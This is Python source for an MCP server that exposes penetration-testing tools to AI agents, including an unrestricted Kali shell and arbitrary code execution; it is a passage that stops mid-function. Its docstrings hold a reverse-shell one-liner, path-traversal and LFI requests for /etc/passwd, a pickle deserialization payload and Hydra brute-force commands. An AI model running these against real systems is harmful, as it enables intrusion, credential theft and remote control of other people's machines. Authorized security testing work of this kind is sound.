"""
Network Recon MCP Server - HTTP Client, HTTP Prober, Port Scanner, Subdomain Enum, URL Discovery, Param Discovery, Web Fuzzer, Shell, Hydra & Amass

Exposes curl HTTP client, httpx HTTP prober, naabu port scanner, subfinder subdomain
enumerator, gau URL discovery, arjun parameter discovery, ffuf web fuzzer, general
command execution, THC Hydra password cracker, and OWASP Amass subdomain enumerator
as MCP tools for agentic penetration testing.

Tools:
    - execute_curl: Execute curl with any CLI arguments
    - execute_httpx: Execute httpx HTTP prober with any CLI arguments
    - execute_naabu: Execute naabu with any CLI arguments
    - execute_subfinder: Execute subfinder with any CLI arguments
    - execute_gau: Execute gau (GetAllUrls) for passive URL discovery from web archives
    - execute_arjun: Execute arjun HTTP parameter discovery with any CLI arguments
    - execute_ffuf: Execute ffuf web fuzzer with any CLI arguments
    - kali_shell: Execute any shell command in the Kali sandbox
    - execute_code: Write code to file and execute (no shell escaping needed)
    - execute_hydra: Execute THC Hydra password cracker with any CLI arguments
    - execute_amass: Execute OWASP Amass subdomain enumeration with any CLI arguments
    - execute_jsluice: Execute jsluice JavaScript static analyzer for hidden endpoints and secrets
    - execute_katana: Execute Katana web crawler for endpoint/URL discovery
"""

from fastmcp import FastMCP
import json
import os
import re
import shlex
import subprocess
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

# Strip ANSI escape codes (terminal colors) from output
ANSI_ESCAPE = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]')

# Server configuration
SERVER_NAME = "network_recon"
SERVER_HOST = os.getenv("MCP_HOST", "0.0.0.0")
SERVER_PORT = int(os.getenv("NETWORK_RECON_PORT", "8000"))

mcp = FastMCP(SERVER_NAME)

# =============================================================================
# HYDRA PROGRESS TRACKING — Thread-safe state for live progress updates
# =============================================================================

_hydra_lock = threading.Lock()
_hydra_output: list = []
_hydra_active: bool = False
_hydra_command: str = ""
_hydra_start_time: float = 0


@mcp.tool()
def execute_curl(args: str) -> str:
    """
    Execute curl HTTP client with any valid CLI arguments.

    Curl is a command-line tool for transferring data with URLs. It supports
    HTTP, HTTPS, FTP, and many other protocols. Useful for HTTP enumeration,
    API testing, and exploiting web vulnerabilities.

    Args:
        args: Command-line arguments for curl (without the 'curl' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        Basic GET request with headers:
        - "-s -i http://10.0.0.5/"

        POST request with JSON:
        - "-s -X POST -H 'Content-Type: application/json' -d '{\"user\":\"admin\",\"pass\":\"admin\"}' http://10.0.0.5/api/login"

        HEAD request (headers only):
        - "-s -I http://10.0.0.5/"

        Custom User-Agent:
        - "-s -i -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' http://10.0.0.5/"

        Follow redirects:
        - "-s -i -L http://10.0.0.5/"

        HTTPS with insecure (skip cert verification):
        - "-s -k https://10.0.0.5/"

        Get only HTTP status code:
        - "-s -o /dev/null -w '%{http_code}' http://10.0.0.5/"

        Send cookie:
        - "-s -i -b 'session=abc123' http://10.0.0.5/admin"

        Upload file:
        - "-s -X POST -F 'file=@/path/to/file.txt' http://10.0.0.5/upload"

        Basic authentication:
        - "-s -i -u admin:password http://10.0.0.5/admin"

        Custom timeout:
        - "-s -i --connect-timeout 10 --max-time 30 http://10.0.0.5/"

        Path traversal test:
        - "-s -i 'http://10.0.0.5/../../../../etc/passwd'"

        LFI test:
        - "-s -i 'http://10.0.0.5/index.php?page=../../../etc/passwd'"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["curl"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=60
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output if output.strip() else "[INFO] No response received"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 60 seconds. Consider using --connect-timeout and --max-time flags."
    except FileNotFoundError:
        return "[ERROR] curl not found. Ensure it is installed and in PATH."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_naabu(args: str) -> str:
    """
    Execute naabu port scanner with any valid CLI arguments.

    Naabu is a fast port scanner written in Go that allows you to enumerate
    valid ports for hosts in a fast and reliable manner. It can also integrate
    with nmap for service detection using the -nmap-cli flag.

    Args:
        args: Command-line arguments for naabu (without the 'naabu' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        Basic port scan:
        - "-host 10.0.0.5 -p 1-1000 -json"

        Scan with top ports:
        - "-host 192.168.1.0/24 -top-ports 100 -json"

        Scan from file:
        - "-list targets.txt -p 22,80,443,8080 -json"

        With nmap service detection:
        - "-host 10.0.0.5 -p 80,443 -nmap-cli 'nmap -sV -sC'"

        Fast scan with high rate:
        - "-host 10.0.0.5 -p 1-65535 -rate 5000 -json"

        Scan specific ports:
        - "-host 10.0.0.5 -p 21,22,23,25,53,80,443,445,3306,3389,5432,8080 -json"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["naabu"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=300
        )
        output = ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            # Strip ANSI codes then filter out progress/info messages, keep errors
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line and not line.startswith('[INF]')
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"
        return output if output.strip() else "[INFO] No open ports found"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 300 seconds. Consider using a smaller port range or higher rate."
    except FileNotFoundError:
        return "[ERROR] naabu not found. Ensure it is installed and in PATH."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_httpx(args: str) -> str:
    """
    Execute httpx HTTP prober with any valid CLI arguments.

    httpx is a fast HTTP toolkit by ProjectDiscovery for probing URLs, detecting
    technologies, extracting titles/status codes/server headers, and following
    redirects. Use for HTTP fingerprinting and live host detection.

    Args:
        args: Command-line arguments for httpx (without the 'httpx' command itself)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        Single target with full fingerprint:
        - "-u http://10.0.0.5 -sc -title -server -td -fr -silent"

        Single target JSON output:
        - "-u http://10.0.0.5 -sc -title -server -td -fr -silent -j"

        Probe specific paths:
        - "-u http://10.0.0.5 -path /,/login,/admin -sc -title -silent -j"

        Tech detection with rate limiting:
        - "-u http://10.0.0.5 -td -sc -title -rl 10 -timeout 10 -silent"

        Probe from file with JSON output:
        - "-l /tmp/hosts.txt -sc -title -server -td -fr -timeout 10 -rl 50 -silent -j -o /tmp/httpx.jsonl"

        Match only specific status codes:
        - "-u http://10.0.0.5 -mc 200,301,302,403 -sc -title -silent"

        Probe custom ports:
        - "-u 10.0.0.5 -p 80,443,8080,8443 -sc -title -server -silent"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["httpx"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=300
        )
        output = ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line and not line.startswith('[INF]')
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"
        return output if output.strip() else "[INFO] No live hosts found"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 300 seconds. Consider using fewer targets or adding -timeout flag."
    except FileNotFoundError:
        return "[ERROR] httpx not found. Ensure it is installed and in PATH."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_subfinder(args: str) -> str:
    """
    Execute subfinder passive subdomain enumerator with any valid CLI arguments.

    Subfinder is a passive subdomain discovery tool by ProjectDiscovery. It uses
    passive OSINT sources (certificate transparency logs, DNS datasets, search
    engines, API integrations) to find subdomains. It does NOT send any traffic
    to the target -- all data comes from third-party sources.

    Args:
        args: Command-line arguments for subfinder (without the 'subfinder' command itself)

    Returns:
        Discovered subdomains (one per line, or JSON if -json flag used)

    Examples:
        Basic subdomain enumeration:
        - "-d example.com -silent"

        JSON output (recommended for structured parsing):
        - "-d example.com -json -silent"

        Use all sources for maximum coverage:
        - "-d example.com -all -json -silent"

        Multiple domains:
        - "-d example.com,sub.example.com -json -silent"

        Domains from file:
        - "-dL /tmp/domains.txt -json -silent"

        With timeout (minutes):
        - "-d example.com -all -json -silent -timeout 5"

        Show only specific sources:
        - "-d example.com -sources crtsh,hackertarget -json -silent"

        List available sources:
        - "-ls"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["subfinder"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=120
        )
        output = ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line and not line.startswith('[INF]')
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"
        return output if output.strip() else "[INFO] No subdomains found"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 120 seconds. Consider using -timeout flag to limit per-source timeout."
    except FileNotFoundError:
        return "[ERROR] subfinder not found. Ensure it is installed and in PATH."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_gau(args: str, urlscan_api_key: str = "") -> str:
    """
    Execute GAU (GetAllUrls) to fetch known URLs from web archive sources.

    GAU is a passive OSINT tool that fetches URLs from Wayback Machine, Common Crawl,
    AlienVault OTX, and URLScan. It does NOT send any traffic to the target -- all data
    comes from third-party archive services.

    Args:
        args: Command-line arguments for gau (without the 'gau' command itself).
              The target domain(s) are passed as positional arguments.

    Returns:
        Discovered URLs (one per line, or JSON if --json flag used)

    Examples:
        Basic URL discovery for a domain:
        - "example.com"

        Include subdomains:
        - "--subs example.com"

        JSON output with structured fields:
        - "--json example.com"

        Filter by specific providers:
        - "--providers wayback,commoncrawl example.com"

        Match only specific status codes:
        - "--mc 200,301,302 example.com"

        Blacklist file extensions (reduce noise):
        - "--blacklist png,jpg,gif,css,woff,svg,ico example.com"

        Multiple threads for faster results:
        - "--threads 5 example.com"

        Output to file (useful for large results):
        - "--o /tmp/gau_urls.txt example.com"

        Combine flags:
        - "--subs --json --blacklist png,jpg,gif,css --threads 5 example.com"
    """
    try:
        # Write GAU config if URLScan API key provided
        if urlscan_api_key:
            config_path = os.path.expanduser("~/.gau.toml")
            with open(config_path, "w") as f:
                f.write(f'[urlscan]\napikey = "{urlscan_api_key}"\n')

        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["gau"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=300
        )
        output = ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line
                and not line.startswith('[INF]')
                and 'using default config' not in line
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"
        return output if output.strip() else "[INFO] No URLs found in archives for this domain"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 300 seconds. Consider using --blacklist to filter extensions or --providers to limit sources."
    except FileNotFoundError:
        return "[ERROR] gau not found. Ensure it is installed and in PATH."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def kali_shell(command: str) -> str:
    """
    Execute any shell command in the Kali Linux sandbox.

    Full access to the Kali Linux environment including all installed tools.
    Use for running exploit scripts, downloading PoCs, encoding payloads,
    or using any Kali tool not exposed as a dedicated MCP tool.

    Args:
        command: The full shell command to execute (run via bash -c)

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        Run a Python exploit script:
        - "python3 -c 'import requests; r=requests.get(\"http://10.0.0.5/\"); print(r.text)'"

        Download a PoC from GitHub:
        - "git clone https://github.com/user/CVE-2021-XXXXX-PoC.git /tmp/poc"

        Run downloaded exploit:
        - "cd /tmp/poc && python3 exploit.py http://10.0.0.5"

        Use netcat for port check:
        - "nc -zv 10.0.0.5 80"

        Base64 encode a payload:
        - "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64"

        Check installed tools:
        - "which sqlmap nikto wfuzz ffuf hydra"
    """
    try:
        result = subprocess.run(
            ["bash", "-c", command],
            capture_output=True,
            text=True,
            timeout=300
        )
        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        return output if output.strip() else "[INFO] Command completed with no output"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 300 seconds."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_code(code: str, language: str = "python", filename: str = "exploit") -> str:
    """
    Write code to a file and execute it with the appropriate interpreter.

    Eliminates shell escaping issues by receiving code as a clean string parameter,
    writing it to a file using a heredoc, and executing the file directly.
    Use this instead of kali_shell when running multi-line scripts.

    Args:
        code: The source code to execute. Multi-line code with proper indentation
              is fully supported — no shell escaping needed.
        language: Programming language (default: "python"). Determines file extension
                  and interpreter. Supported: python, bash, ruby, perl, c, cpp
        filename: Base filename without extension (default: "exploit").
                  File is created at /tmp/{filename}.{ext}

    Returns:
        Combined stdout + stderr from execution, or compilation error for compiled languages.

    Examples:
        Python exploit script:
        - code: "import requests\\nr = requests.post('http://10.0.0.5/vuln', data={'cmd': 'id'})\\nprint(r.text)"

        Python deserialization payload:
        - code: "import pickle, base64, os\\nclass E:\\n    def __reduce__(self):\\n        return (os.system, ('id',))\\nprint(base64.b64encode(pickle.dumps(E())).decode())"

        Bash enumeration script:
        - code: "#!/bin/bash\\nfor port in 80 443 8080; do\\n  curl -s -o /dev/null -w \\"%{http_code} $port\\\\n\\" http://10.0.0.5:$port/\\ndone"
          language: "bash"

        C exploit (compiled with gcc):
        - code: "#include <stdio.h>\\nint main() { printf(\\"uid=%d\\\\n\\", getuid()); return 0; }"
          language: "c"
    """
    if not code or not code.strip():
        return "[ERROR] No code provided to execute"

    # Normalize language and map to (extension, interpreter_or_None)
    language = language.lower().strip()
    LANG_MAP = {
        "python": ("py", "python3"),
        "py":     ("py", "python3"),
        "bash":   ("sh", "bash"),
        "sh":     ("sh", "bash"),
        "shell":  ("sh", "bash"),
        "ruby":   ("rb", "ruby"),
        "rb":     ("rb", "ruby"),
        "perl":   ("pl", "perl"),
        "pl":     ("pl", "perl"),
        "c":      ("c",  None),
        "cpp":    ("cpp", None),
        "c++":    ("cpp", None),
    }

    if language not in LANG_MAP:
        supported = sorted(set(LANG_MAP.keys()))
        return f"[ERROR] Unsupported language: '{language}'. Supported: {', '.join(supported)}"

    ext, interpreter = LANG_MAP[language]

    # Sanitize filename to prevent path traversal / shell injection
    safe_filename = re.sub(r'[^a-zA-Z0-9_-]', '_', filename)
    filepath = f"/tmp/{safe_filename}.{ext}"
    binary_path = f"/tmp/{safe_filename}"

    # Step 1: Write code to file using single-quoted heredoc (no shell interpretation)
    write_cmd = f"cat << 'REDAMON_CODE_EOF' > {filepath}\n{code}\nREDAMON_CODE_EOF"
    try:
        write_result = subprocess.run(
            ["bash", "-c", write_cmd],
            capture_output=True,
            text=True,
            timeout=10
        )
        if write_result.returncode != 0:
            return f"[ERROR] Failed to write code file: {write_result.stderr}"
    except Exception as e:
        return f"[ERROR] Failed to write code file: {str(e)}"

    # Step 2: Execute (interpreted) or compile+execute (compiled)
    try:
        if interpreter:
            # Interpreted language — run directly
            result = subprocess.run(
                [interpreter, filepath],
                capture_output=True,
                text=True,
                timeout=120
            )
        else:
            # Compiled language — compile first, then execute
            compiler = "gcc" if ext == "c" else "g++"
            compile_result = subprocess.run(
                [compiler, filepath, "-o", binary_path],
                capture_output=True,
                text=True,
                timeout=60
            )
            if compile_result.returncode != 0:
                return f"[ERROR] Compilation failed:\n{compile_result.stderr}"

            result = subprocess.run(
                [binary_path],
                capture_output=True,
                text=True,
                timeout=120
            )

        output = result.stdout
        if result.stderr:
            output += f"\n[STDERR]: {result.stderr}"
        if result.returncode != 0 and not output.strip():
            return f"[ERROR] Code exited with code {result.returncode}"
        return output if output.strip() else "[INFO] Code executed with no output"

    except subprocess.TimeoutExpired:
        return "[ERROR] Code execution timed out after 120 seconds."
    except FileNotFoundError as e:
        return f"[ERROR] Interpreter/compiler not found: {str(e)}"
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_hydra(args: str) -> str:
    """
    Execute THC Hydra password cracker with any valid CLI arguments.

    Hydra is a fast, parallelised network login cracker supporting 50+ protocols.
    It runs, reports results, and exits (stateless — no persistent sessions).
    Output is streamed line-by-line for live progress tracking.

    Args:
        args: Command-line arguments for hydra (without the 'hydra' command itself)

    Returns:
        Command output with found credentials or status information

    Examples:
        SSH brute force (max 4 threads for SSH):
        - "-l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 -f -e nsr -V ssh://10.0.0.5"

        FTP brute force:
        - "-l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -f -e nsr -V ftp://10.0.0.5"

        SMB with domain:
        - '-l "DOMAIN\\administrator" -P passwords.txt -f -V smb://10.0.0.5'

        HTTP POST form (target before protocol, form spec uses colons):
        - '-l admin -P passwords.txt -f -V 10.0.0.5 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"'

        RDP (max 1 thread):
        - "-l Administrator -P passwords.txt -t 1 -f -V rdp://10.0.0.5"

        VNC (password-only, no username):
        - '-p "" -P passwords.txt -f -V vnc://10.0.0.5'

        MySQL:
        - "-l root -P passwords.txt -f -V mysql://10.0.0.5"

        Redis (password-only):
        - '-p "" -P passwords.txt -f -V redis://10.0.0.5'

        Colon-separated user:pass file:
        - "-C /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt -f ssh://10.0.0.5"
    """
    global _hydra_output, _hydra_active, _hydra_command, _hydra_start_time

    try:
        cmd_args = shlex.split(args)

        # Initialize progress state
        with _hydra_lock:
            _hydra_output = []
            _hydra_active = True
            _hydra_command = args[:100]
            _hydra_start_time = time.time()

        proc = subprocess.Popen(
            ["hydra"] + cmd_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # Merge stderr into stdout for unified streaming
            text=True,
            bufsize=1  # Line-buffered
        )

        output_lines = []
        try:
            for line in proc.stdout:
                clean_line = ANSI_ESCAPE.sub('', line.rstrip())
                output_lines.append(clean_line)
                with _hydra_lock:
                    _hydra_output.append(clean_line)
        except Exception:
            pass

        # Wait for process to finish (should already be done after stdout EOF)
        try:
            proc.wait(timeout=1800)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            output_lines.append("[ERROR] Timed out after 1800s.")

        # Mark execution complete
        with _hydra_lock:
            _hydra_active = False

        output = '\n'.join(output_lines)
        return output if output.strip() else "[INFO] No valid credentials found"

    except FileNotFoundError:
        with _hydra_lock:
            _hydra_active = False
        return "[ERROR] hydra not found. Ensure it is installed in the container."
    except Exception as e:
        with _hydra_lock:
            _hydra_active = False
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_jsluice(args: str) -> str:
    """
    Execute jsluice JavaScript static analyzer with any valid CLI arguments.

    jsluice extracts hidden API endpoints, URL paths, query parameters, and
    secrets (AWS keys, API tokens, credentials) from JavaScript files via
    static analysis. It reads LOCAL files only -- no network traffic is sent.

    JS files must be downloaded first (e.g., via execute_curl) to the local
    filesystem before analysis.

    Args:
        args: Command-line arguments for jsluice (without the 'jsluice' command itself)

    Returns:
        JSON lines output (one JSON object per line) or error message

    Examples:
        Extract URLs/endpoints from a JS file:
        - "urls /tmp/app.js"

        Extract URLs with resolved absolute paths:
        - "urls --resolve-paths http://10.0.0.5 /tmp/app.js"

        Extract secrets (API keys, AWS credentials, tokens):
        - "secrets /tmp/app.js"

        Analyze multiple files:
        - "urls /tmp/js/app.js /tmp/js/vendor.js /tmp/js/main.js"

        Extract URLs with concurrency:
        - "urls --concurrency 5 /tmp/js/app.js /tmp/js/vendor.js"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["jsluice"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=120
        )
        output = result.stdout
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line.strip()
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"
        return output if output.strip() else "[INFO] No results found in the analyzed files"
    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 120 seconds."
    except FileNotFoundError:
        return "[ERROR] jsluice not found. Ensure it is installed in the Kali sandbox."
    except Exception as e:
        return f"[ERROR] {str(e)}"


# =============================================================================
# HTTP PROGRESS SERVER — For live Hydra progress updates during execution
# =============================================================================

HYDRA_PROGRESS_PORT = int(os.getenv("HYDRA_PROGRESS_PORT", "8014"))


def get_hydra_progress() -> dict:
    """Get current Hydra execution progress (thread-safe)."""
    with _hydra_lock:
        raw_output = '\n'.join(_hydra_output[-100:])
        clean_output = ANSI_ESCAPE.sub('', raw_output)
        return {
            "active": _hydra_active,
            "command": _hydra_command,
            "elapsed_seconds": round(time.time() - _hydra_start_time, 1) if _hydra_active else 0,
            "line_count": len(_hydra_output),
            "output": clean_output
        }


@mcp.tool()
def execute_masscan(args: str) -> str:
    """
    Execute masscan port scanner with any valid CLI arguments.

    Masscan is the fastest port scanner — optimized for scanning large networks
    and IP ranges using asynchronous SYN packets. Requires root or CAP_NET_RAW.

    IMPORTANT: Masscan only accepts IP addresses and CIDR ranges (NOT hostnames).
    Resolve hostnames to IPs first using dig/nslookup before scanning.

    Args:
        args: Complete masscan CLI arguments as a single string.

    Examples:
        "10.0.0.0/24 -p 80,443 --rate 1000"
        "-iL /tmp/ips.txt --top-ports 100 --rate 5000"
        "192.168.1.1 -p 0-65535 --rate 10000 --banners"

    Returns:
        Masscan scan output or error message.
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["masscan"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=600
        )

        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            stderr_lines = result.stderr.strip().split('\n')
            useful_stderr = [l for l in stderr_lines if not l.startswith('rate:')]
            if useful_stderr:
                output += "\n[STDERR]\n" + "\n".join(useful_stderr)

        return output.strip() if output.strip() else "[INFO] Scan completed with no output."

    except subprocess.TimeoutExpired:
        return "[ERROR] Command timed out after 600 seconds. Use smaller target ranges or fewer ports."
    except FileNotFoundError:
        return "[ERROR] masscan not found. Ensure it is installed in the Kali sandbox."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_wpscan(args: str) -> str:
    """
    Execute WPScan WordPress vulnerability scanner with any valid CLI arguments.

    WPScan is a black-box WordPress security scanner that detects security issues
    in WordPress installations including vulnerable plugins, themes, weak passwords,
    and configuration issues. Requires WPScan API token for vulnerability data.

    Args:
        args: Command-line arguments for wpscan (without the 'wpscan' command itself)

    Returns:
        Scan results in JSON format (when --format json is used) or text output

    Examples:
        Basic scan with JSON output:
        - "--url http://example.com --format json --no-banner"

        Enumerate plugins and themes:
        - "--url http://example.com --enumerate p,t --format json --no-banner"

        With API token for vulnerability data:
        - "--url http://example.com --api-token YOUR_TOKEN --format json --no-banner"

        Aggressive plugin detection:
        - "--url http://example.com --enumerate p --plugins-detection aggressive --format json --no-banner"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["wpscan"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=600
        )

        output = ""
        if result.stdout:
            output += ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line and not line.startswith('[i]') and 'warning:' not in line.lower()
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"

        if not output.strip():
            return "[INFO] WPScan completed with no output. Target may not be a WordPress site."

        return output

    except subprocess.TimeoutExpired:
        return "[ERROR] WPScan timed out after 600 seconds."
    except FileNotFoundError:
        return "[ERROR] wpscan not found. Ensure it is installed in the Kali sandbox."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_amass(args: str) -> str:
    """
    Execute OWASP Amass subdomain enumeration and network mapping tool.

    Amass discovers subdomains via passive sources (certificate transparency,
    DNS records, web archives, search engines) and active techniques (DNS
    brute-force, zone transfers, NSEC walking). Use for expanding attack
    surface by finding additional subdomains and related infrastructure.

    Args:
        args: Command-line arguments for amass (without the 'amass' command itself).
              Typically starts with a subcommand: enum, intel, or db.

    Returns:
        Command output (stdout + stderr combined)

    Examples:
        Passive subdomain enumeration (default):
        - "enum -d example.com -timeout 5"

        Active enumeration with DNS brute-force:
        - "enum -d example.com -active -brute -timeout 10"

        Passive only (no DNS queries to target):
        - "enum -passive -d example.com -timeout 5"

        Multiple domains:
        - "enum -d example.com,sub.example.com -timeout 5"

        Intel - discover root domains from ASN:
        - "intel -asn 12345"

        Output to JSON:
        - "enum -d example.com -json /tmp/amass_output.json -timeout 5"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["amass"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=1800  # 30 min hard limit — passive+active enum on real domains often needs 15-25 min
        )

        output = ""
        if result.stdout:
            output += ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line and not line.startswith('Querying ')
                and not line.startswith('[INF]')
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"

        if not output.strip():
            return "[INFO] Amass completed with no output. No subdomains found for the target."

        return output

    except subprocess.TimeoutExpired:
        return "[ERROR] Amass timed out after 660 seconds. Use -timeout flag to set a shorter amass timeout."
    except FileNotFoundError:
        return "[ERROR] amass not found. Ensure it is installed in the Kali sandbox."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_katana(args: str) -> str:
    """
    Execute Katana web crawler for endpoint and URL discovery.

    Katana is a fast web crawler by ProjectDiscovery that discovers endpoints,
    URLs, and JavaScript-linked paths on web targets. Supports standard crawling,
    JavaScript parsing, and known-file enumeration (robots.txt, sitemap.xml).

    Args:
        args: Command-line arguments for katana (without the 'katana' command itself)

    Returns:
        Crawl results as text (one URL per line) or JSON lines when -jsonl is used.

    Examples:
        Fast crawl with JS parsing:
        - "-u https://10.0.0.5 -d 3 -jc -silent"

        Deeper crawl with rate limiting and JSON output:
        - "-u https://10.0.0.5 -d 5 -jc -kf all -c 10 -rl 50 -silent -jsonl"

        Crawl with extension filter and known-file discovery:
        - "-u https://10.0.0.5 -d 3 -jc -kf robotstxt -c 10 -rl 50 -timeout 10 -ef png,jpg,gif,css,woff,woff2,ttf -silent"

        Save output to file for large crawls:
        - "-u https://10.0.0.5 -d 3 -jc -kf robotstxt -c 10 -rl 50 -ef png,jpg,gif,css,woff,woff2,ttf -silent -jsonl -o /tmp/katana.jsonl"

        Headless crawl (requires Chrome in container):
        - "-u https://10.0.0.5 -hl -sc -d 3 -silent -jsonl"
    """
    try:
        cmd_args = shlex.split(args)

        # Auto-inject -silent to suppress banner/progress noise
        if '-silent' not in cmd_args:
            cmd_args.append('-silent')

        result = subprocess.run(
            ["katana"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=1800  # 30 min -- depth=2 + JS crawling on real sites routinely exceeds 10 min
        )

        output = ""
        if result.stdout:
            output += ANSI_ESCAPE.sub('', result.stdout)
        if result.stderr:
            clean_stderr = ANSI_ESCAPE.sub('', result.stderr)
            stderr_lines = [
                line for line in clean_stderr.split('\n')
                if line.strip()
                and not line.startswith('[INF]')
                and not line.startswith('[WRN]')
            ]
            if stderr_lines:
                output += f"\n[STDERR]: {chr(10).join(stderr_lines)}"

        if not output.strip():
            return "[INFO] Katana completed with no output. No URLs/endpoints discovered for the target."

        return output

    except subprocess.TimeoutExpired:
        return "[ERROR] Katana timed out after 600 seconds. Consider reducing -d (depth), lowering -c (concurrency), or narrowing scope."
    except FileNotFoundError:
        return "[ERROR] katana not found. Ensure it is installed in the Kali sandbox."
    except Exception as e:
        return f"[ERROR] {str(e)}"


@mcp.tool()
def execute_arjun(args: str) -> str:
    """
    Execute Arjun HTTP parameter discovery tool with any valid CLI arguments.

    Arjun finds hidden/undocumented query and body parameters by brute-forcing
    common parameter names (~25,000) against target URLs. Useful for discovering
    debug parameters, admin functionality, and hidden API inputs before testing
    for injection vulnerabilities (SQLi, XSS, SSRF, command injection).

    Args:
        args: Command-line arguments for arjun (without the 'arjun' command itself).
              Always use -oJ for structured JSON output.

    Returns:
        Discovered parameters in JSON format (when -oJ is used) or text output.

    Examples:
        Basic parameter discovery on a URL:
        - "-u http://10.0.0.5/api/users -oJ /tmp/arjun_out.json"

        Scan with specific HTTP method (GET, POST, JSON, XML):
        - "-u http://10.0.0.5/search -m POST -oJ /tmp/arjun_out.json"

        Multiple URLs from file:
        - "-i /tmp/urls.txt -oJ /tmp/arjun_out.json"

        Rate-limited scan (WAF evasion):
        - "-u http://10.0.0.5/ --rate-limit 10 --stable -oJ /tmp/arjun_out.json"

        Custom headers (e.g. authentication):
        - "-u http://10.0.0.5/api -m JSON --headers 'Authorization: Bearer TOKEN' -oJ /tmp/arjun_out.json"

        Passive mode (CommonCrawl/OTX/Wayback only, no active requests):
        - "-u http://10.0.0.5/ --passive -oJ /tmp/arjun_out.json"

        Custom wordlist:
        - "-u http://10.0.0.5/ -w /tmp/params.txt -oJ /tmp/arjun_out.json"
    """
    try:
        cmd_args = shlex.split(args)
        result = subprocess.run(
            ["arjun"] + cmd_args,
            capture_output=True,
            text=True,
            timeout=1200
        )

        output = ""
        if result.stdout:
